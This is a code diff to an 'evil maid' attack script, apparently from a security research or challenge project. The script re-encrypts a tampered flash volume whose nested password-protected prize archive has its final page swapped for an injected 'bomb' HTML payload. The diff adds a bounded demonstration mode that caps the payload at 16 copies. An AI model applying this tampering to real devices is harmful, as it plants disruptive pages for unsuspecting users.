@@ -2,10 +2,11 @@
 """Replace the prize page in a decrypted FAT12 volume and re-encrypt the volume
 
 The script reuses attack3 recovery and preserves the ZIP layer passwords
-It writes a storage image and a full flash image
+The default mode writes storage and full flash images; the bounded mode writes a prize ZIP
 See attack2/README.md for delivery paths and the limits of the browser payload proof
 """
 import os
+import shutil
 import subprocess
 import sys
 import tempfile
@@ -15,6 +16,7 @@ sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."
 import recover_keystream as R  # noqa: E402  (shared cipher math, single source)
 import matryoshka as M         # noqa: E402
 import bomb_html               # noqa: E402
+import browser_demo            # noqa: E402
 
 
 def _mtool(*args):
@@ -24,10 +26,10 @@ def _mtool(*args):
     return r.stdout
 
 
-def build_evil_prize(work, orig_prize_zip):
-    """Turn the real your_prize.zip into one whose final layer is a bomb page.
+def build_evil_prize(work, orig_prize_zip, bounded_copies=None):
+    """Replace the final page and rebuild the original password-protected layers.
 
-    Returns (new_prize_path, depth, original_final_size, bomb_size).
+    Returns the archive path, layer depth, original page size, and payload size.
     """
     with zipfile.ZipFile(orig_prize_zip) as z:
         names = z.namelist()
@@ -39,8 +41,10 @@ def build_evil_prize(work, orig_prize_zip):
     final_path, depth = M.unwrap(peel, layers_zip)
     orig_final_size = os.path.getsize(final_path)
 
-    original = open(final_path, "rb").read()
-    injected = bomb_html.inject_bomb(original)
+    with open(final_path, "rb") as final:
+        original = final.read()
+    injected = (bomb_html.inject_bomb(original) if bounded_copies is None
+                else browser_demo.bounded_page(original, bounded_copies))
     with open(final_path, "wb") as f:
         f.write(injected)
 
@@ -55,6 +59,27 @@ def build_evil_prize(work, orig_prize_zip):
 
 
 def main(argv):
+    if len(argv) > 1 and argv[1] == "--bounded-archive":
+        if len(argv) != 5:
+            print("Usage: evil_maid.py --bounded-archive <source_prize.zip> <output.zip> <copies>",
+                  file=sys.stderr)
+            return 2
+        source, output = argv[2:4]
+        try:
+            copies = int(argv[4])
+            if not 1 <= copies <= 16:
+                raise ValueError("Copy limit must be between 1 and 16")
+            if os.path.exists(output) or os.path.islink(output):
+                raise FileExistsError(f"Output already exists: {output}")
+            with tempfile.TemporaryDirectory() as work:
+                archive, depth, _, size = build_evil_prize(work, source, bounded_copies=copies)
+                with open(archive, "rb") as payload, open(output, "xb") as target:
+                    shutil.copyfileobj(payload, target)
+            print(f"Saved: {output} ({depth} encrypted layers, {size} HTML bytes, {copies} bounded copies)")
+        except (OSError, ValueError, RuntimeError, zipfile.BadZipFile) as error:
+            print(f"Archive build failed: {error}", file=sys.stderr)
+            return 1
+        return 0
     if len(argv) < 2:
         print(__doc__)
         return 2
